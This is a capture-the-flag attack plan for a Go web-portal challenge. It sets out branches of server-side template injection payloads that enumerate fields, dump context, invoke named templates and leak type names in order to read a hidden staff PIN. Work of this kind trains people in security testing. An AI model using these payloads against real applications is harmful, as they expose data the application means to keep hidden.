# Griffin Corp Careers Portal — Attack Plan

**Target:** `ssh -p 2223 anyname@192.168.11.224`
**Goal:** badge PIN in the staff onboarding note
**Core lead:** the filter prompt says it "expands `{{.Field}}` against the session context" — this is Go `text/template` syntax. The filter box is almost certainly fed straight into a Go template engine, which makes this a **server-side template injection (SSTI)** challenge.

**Rules:** single shared instance, no brute-forcing, no using it as a proxy, no attacking the host. Everything below stays inside the portal's own UI.

**CONFIRMED:** top-right of the UI shows `Role: guest`. This is near-certainly the `.Role` field referenced by the filter's `{{.Field}}` templating. Goal is to get this to read `staff` (or trigger whatever staff-gated content the engine exposes), not necessarily to literally overwrite the on-screen text.

---

## 0. Setup (do this every session)

- `script -a portal.log` before you `ssh` in, so every screen is logged.
- Maximize the terminal.
- Photograph: main menu, every posting (full scroll), the filter screen, and **the top-right corner of the UI** — you noted something there but didn't record it. Get that first.

---

## 1. Decision table — what to try, and what each result means

| Step | Action (type this in the filter box) | If you see... | It means... | Next step |
|---|---|---|---|---|
| 1a | `{{.}}` | Full dump of a struct/map | Engine renders the whole context — best case | Go to **Step 2** (enumerate fields from the dump) |
| 1b | `{{.}}` | "no posting match" (same as any text) | Your input isn't reaching the template engine raw, OR output is swallowed unless it matches a posting title | Try 1c |
| 1c | `{{printf "%v" .}}` | Same struct dump, different formatting | Confirms engine + tells you it supports function calls (`printf`) | Go to **Step 2** |
| 1d | `{{printf "%v" .}}` | Error text appears | Error messages may leak field/type names | Read the error carefully, note any `field X not defined` or `can't evaluate field Y` — these name real struct fields |
| 1e | Any `{{...}}` input | Literal `{{...}}` echoed back unmodified | Template injection is **not live** in this box; engine escapes/doesn't parse it | Stop this branch — look at **Step 4** (other input surfaces) instead |

---

## 2. Field enumeration

If 1a/1c/1d suggest the engine is live, try these one at a time. Log the exact output of each.

**Priority: `.Role` is confirmed to exist (you can see it reads `guest` on screen). Try this first, before the others.**

| Filter input | Guess purpose | Expected if valid |
|---|---|---|
| `{{.Role}}` | current viewer role — **confirmed field, start here** | should render `guest` back at you — proves the engine evaluates `.Role` the same way the UI does |
| `{{.User}}` / `{{.Username}}` | identity | your "anyname" or similar |
| `{{.Nonce}}` / `{{.Session}}` | the session nonce you already see | matches what's on screen (confirms field name) |
| `{{.IsStaff}}` / `{{.Staff}}` | boolean gate | `true`/`false` |
| `{{.Admin}}` | boolean gate | `true`/`false` |
| `{{.Pin}}` / `{{.BadgePin}}` | the flag itself | PIN, if you're lucky and it's in context even as guest |
| `{{.Note}}` / `{{.StaffNote}}` / `{{.OnboardingNote}}` | the target note | flag text |
| `{{.Postings}}` | list of jobs | dump of the job list — confirms `.` is the whole context object, postings is a sub-field |

**Table: how to read errors from this step**

| Error text pattern | Meaning |
|---|---|
| `can't evaluate field X in type Y` | `X` doesn't exist, but `Y` is a real type name — note it, it may hint at a Go struct name you can search for context clues elsewhere |
| `nil pointer evaluating ...` | field exists but is empty/unset for you as guest — likely populated for staff |
| no error, blank result | field exists but renders empty string |
| "no posting match" | the string, after template rendering, didn't equal any job title — so rendering happened, just didn't match — **this is actually a good sign**, it means your `{{...}}` got evaluated into something, just not a job title. Try wrapping known text around it, e.g. `Security Research Engineer{{""}}` to test if partial literal text still matches. |

---

## 2.5. Escalating `.Role` specifically

Now that `.Role` is a known-good field, these are the most promising next moves — try in this order:

| Try | Why |
|---|---|
| `{{.Role}}` | Baseline — confirm it echoes `guest`, proves filter box reaches the same context as the UI |
| `{{if eq .Role "guest"}}GUEST{{else}}OTHER{{end}}` | Confirms conditionals work on `.Role` specifically |
| `{{with .Role}}{{.}}{{end}}` | Alternate path to the same value, useful if `if/eq` errors for syntax reasons |
| Look for a **sibling field**, not an edit: `{{.StaffNote}}`, `{{.IsStaff}}`, `{{.Badge}}`, `{{.Permissions}}` | Since Go templates can't assign, the realistic win is a *separate* field that's already populated with staff content regardless of what `.Role` says — not changing `.Role` itself |
| `{{range .}}{{.}}{{end}}` or `{{.}}` again, now armed with "Role" as a known key | If the whole context dumps, you now know what a real field name looks like in the output — scan the dump for anything PIN/note/staff-shaped |

**Key realistic goal:** don't try to flip `.Role` to `staff` — Go templates are read-only. Instead look for *another* field in the same context struct that already holds the staff note, and is simply never shown by the normal UI because the UI only renders it conditionally on `.Role`. The template injection lets you read that field directly, bypassing the UI's own guard.

---

## 3. Once you find a real field (role/staff/admin-type)

Go's `text/template` **cannot assign** (`{{.Role = "staff"}}` will error — expected, not a bug). So don't waste time there. Instead:

| Try | Why |
|---|---|
| `{{if .IsStaff}}STAFF{{else}}GUEST{{end}}` | Confirms engine supports control-flow actions, not just field access |
| `{{range .Postings}}{{.}}{{end}}` | Confirms `range` works — if postings is a slice, this dumps all of them, maybe including hidden/staff-only postings not shown in the normal list |
| `{{with .Staff}}{{.}}{{end}}` | `with` only renders if the field is non-empty/truthy — useful to probe without erroring on nil |
| `{{template "staff" .}}` | If the engine has multiple named templates loaded, this tries to invoke a different one directly — a classic SSTI escalation. Try common names: `"staff"`, `"admin"`, `"note"`, `"onboarding"` |
| `{{.Context}}` then dig deeper, e.g. `{{.Context.Staff}}` | Session context may be nested one level deeper than you expect |

**Branch point:** if `{{range .Postings}}{{.}}{{end}}` reveals a posting you haven't seen in the normal UI (e.g. a "Staff Onboarding" entry), that's likely your path — go view/open it through the normal UI if listed, or keep digging with `.` chained onto it: `{{range .Postings}}{{.Title}} - {{.Body}}{{end}}`.

---

## 4. If template injection is dead (Step 1e)

| Fallback | What to check |
|---|---|
| Top-right corner of UI | You flagged this earlier — screenshot it first. Could be your role, a counter, or a hidden status field. |
| The "posts it on the top like it's available" behavior when typing a job title | Try typing *partial* titles, or titles with trailing/leading spaces, or the **Platform SRE** title specifically — SRE posting mentions an internal ops service on loopback, which is flavor text but may hint the portal process itself proxies to that service for staff. |
| Character counter "red herring" claim | Don't fully dismiss it — check if there's a length cutoff where behavior changes (e.g. does typing exactly the nonce length, or a specific number of characters, change anything?) |
| Arrow-key / menu-only interaction | Since `/` filter may be dead-ended, check if `enter` on a posting (not just viewing it) does something role-aware, e.g. "apply" vs "view" |

---

## 5. Logging discipline

For every attempt:
1. Type it.
2. Photograph the result.
3. Write one line in your notes: `INPUT -> OUTPUT (short)`.

This matters because the challenge says the nonce doesn't expire — you can take your time, but you also won't easily remember which of 20 near-identical attempts did what. Keep a running numbered log (e.g. `001: {{.}} -> no posting match`) so you can diff behavior across attempts.

---

## 5.5. Master list — every input to try, by branch

Work top to bottom. Stop a branch as soon as it errors or clearly fails; move to the next. Log every result as `INPUT -> OUTPUT`.

### Branch A — Confirm the engine is live
```
{{.}}
{{.Role}}
{{printf "%v" .}}
```

### Branch B — Enumerate top-level fields (guessing names)
```
{{.Role}}
{{.User}}
{{.Username}}
{{.Name}}
{{.Nonce}}
{{.Session}}
{{.SessionID}}
{{.Context}}
{{.IsStaff}}
{{.Staff}}
{{.Admin}}
{{.IsAdmin}}
{{.Permissions}}
{{.Access}}
{{.Level}}
{{.Clearance}}
{{.Pin}}
{{.PIN}}
{{.BadgePin}}
{{.Badge}}
{{.Note}}
{{.Notes}}
{{.StaffNote}}
{{.OnboardingNote}}
{{.Onboarding}}
{{.Postings}}
{{.Jobs}}
{{.Listings}}
```

### Branch C — Control flow on confirmed fields (once `.Role` is confirmed)
```
{{if eq .Role "guest"}}GUEST{{else}}OTHER{{end}}
{{if eq .Role "staff"}}YES{{else}}NO{{end}}
{{with .Role}}{{.}}{{end}}
{{with .Staff}}{{.}}{{end}}
{{with .Note}}{{.}}{{end}}
```

### Branch D — Range over collections (dump everything inside a slice/map)
```
{{range .}}{{.}}{{end}}
{{range .Postings}}{{.}}{{end}}
{{range .Postings}}{{.Title}} - {{.Body}}{{end}}
{{range $k, $v := .}}{{$k}}: {{$v}}{{end}}
```
The `$k, $v` form is useful if the context is a map — it prints key names you didn't have to guess.

### Branch E — Named template invocation (escalation if multiple templates exist)
```
{{template "staff" .}}
{{template "admin" .}}
{{template "note" .}}
{{template "onboarding" .}}
{{template "onboarding-note" .}}
```

### Branch F — Nested field access (if `.Context` or similar is a struct, not a string)
```
{{.Context.Role}}
{{.Context.Staff}}
{{.Session.Role}}
{{.Session.Nonce}}
{{.User.Role}}
{{.User.Staff}}
```

### Branch G — Deliberate errors to leak type/field info
```
{{.Foo.Bar}}
{{.Zzz}}
{{.Role.Zzz}}
```
Read whatever error text comes back carefully — Go template errors often include the real type name or a list of valid field names.

### Branch H — Function calls (only if Branch A showed `printf` working)
```
{{printf "%+v" .}}
{{printf "%#v" .}}
{{len .}}
{{len .Postings}}
```
`%+v` and `%#v` print field names alongside values — much more useful than `%v` alone if the engine allows it.

---

## 5.6. Terminal input gotchas

Before you conclude a branch "doesn't work," rule out your own terminal mangling the input:

| Symptom | Likely cause | Fix |
|---|---|---|
| `{{` or `}}` seems to vanish or only one brace shows | Some terminal emulators / SSH clients treat `{` as a readline or shell-expansion character in certain modes | Type slowly, or paste instead of typing live, and watch the line as you go |
| Quotes (`"`) inside the filter get smart-quoted or stripped | Terminal or OS autocorrect (common on phones/some SSH apps) | Use a plain terminal app, disable autocorrect/smart punctuation if on mobile |
| `$` in `{{range $k, $v := .}}` triggers shell variable behavior | You're not actually inside a shell here (it's the portal's own input box), but some SSH clients still intercept `$` for local line editing | Try typing it directly in the portal's filter field, not at a shell prompt |
| Backspace/arrow keys show garbage (`^[[D` etc.) | Terminal type mismatch | Set `TERM=xterm-256color` before `ssh`, or try a different terminal app |
| Nothing happens at all when hitting enter | The portal may require a specific keybinding to submit the filter vs. just typing | Re-check Image 1's footer: `enter apply  esc clear  q quit` — confirm you're pressing the right key for "submit" vs "clear" |

If a given input *looks* identical across two attempts but gives different results, suspect hidden whitespace or a dropped character — retype it character by character rather than relying on terminal history/up-arrow.

---

## Branch I — Built-in Go template functions and method calls

This is the branch most likely to actually break something open if A–H stall. `text/template` (as opposed to `html/template`) has **no output escaping and no sandboxing** — if the portal is using `text/template`, and the context object has any methods (not just fields), you may be able to call them directly. This is the real "nuclear option" of Go SSTI.

### I.1 — Built-in functions (always available in `text/template`)
```
{{index .Postings 0}}
{{index . "Role"}}
{{and .Role "x"}}
{{or .Role "default"}}
{{not .Role}}
{{eq .Role "guest"}}
{{len .}}
{{print .}}
{{println .}}
```
`index` is worth prioritizing — `{{index . "FieldName"}}` sometimes works even when `{{.FieldName}}` doesn't, depending on whether the context is a struct or a map, and it lets you probe field names as *strings* rather than guessing Go-identifier casing.

### I.2 — Method calls (if the context type has methods, not just fields)
```
{{.IsStaff}}
{{.HasAccess}}
{{.CheckRole}}
{{.GetNote}}
{{.String}}
```
In Go templates, `{{.Foo}}` works identically whether `Foo` is a struct field *or* a zero-argument method — so every guess in Branch B is implicitly also a method-call attempt. No separate syntax needed, just keep guessing verb-shaped names here (`Get...`, `Is...`, `Has...`, `Check...`) in addition to noun-shaped field names.

### I.3 — `call` for function-valued fields (long shot, but cheap to try)
```
{{call .Func}}
{{call .Authorize "staff"}}
```
Only works if a field literally holds a function value — unlikely, but a single-line, zero-risk thing to try once.

### I.4 — Comparison chains (useful once you know `.Role` is a string)
```
{{if or (eq .Role "guest") (eq .Role "")}}DEFAULT{{else}}{{.Role}}{{end}}
```
Occasionally reveals that `.Role` has a value you haven't guessed yet (not `guest`, not empty, something else) by process of elimination through the `else` branch.

---

## 7. Attempt log (copy this table into your notes and fill it in)

| # | Branch | Input | Output (short) | Notes |
|---|---|---|---|---|
| 001 | A | `{{.}}` | | |
| 002 | A | `{{.Role}}` | | |
| 003 | | | | |

Keep numbering sequentially across the whole session, even across branches — it's the only way to be sure you haven't repeated an attempt and gotten confused about what you've already ruled out.

---

## 8. Time budget — when to cut a branch

You have unlimited time (nonce doesn't expire), but your own attention doesn't. Rough guide:

| If you've spent... | And seen... | Then... |
|---|---|---|
| ~10 inputs on Branch A | Nothing but "no posting match" every time, including `{{.}}` and `{{.Role}}` | Template injection is probably not reachable from this box — move to Section 4 (fallback, non-template approaches) |
| ~20 inputs on Branch B | `.Role` works but every other guess errors or does nothing | Switch to Branch D (`range`/map dumps) instead of continuing to guess names one at a time — it's more efficient |
| Any clean full-context dump (`{{.}}` or `{{range $k,$v := .}}`) succeeds | A big blob of text | Stop guessing entirely — just read the blob carefully for anything PIN/note/staff-shaped. This is almost certainly faster than any further guessing. |
| Branch I method-call guesses all fail | Nothing but errors | You've likely exhausted the template-injection angle for now — re-screenshot the top-right corner and job postings in case something changed, and revisit Section 4 |

---

## 6. When you find the note

Flag format: `tribectf{PIN}` — the PIN is whatever value sits in the staff onboarding note. Grab the exact text/number, don't paraphrase it.
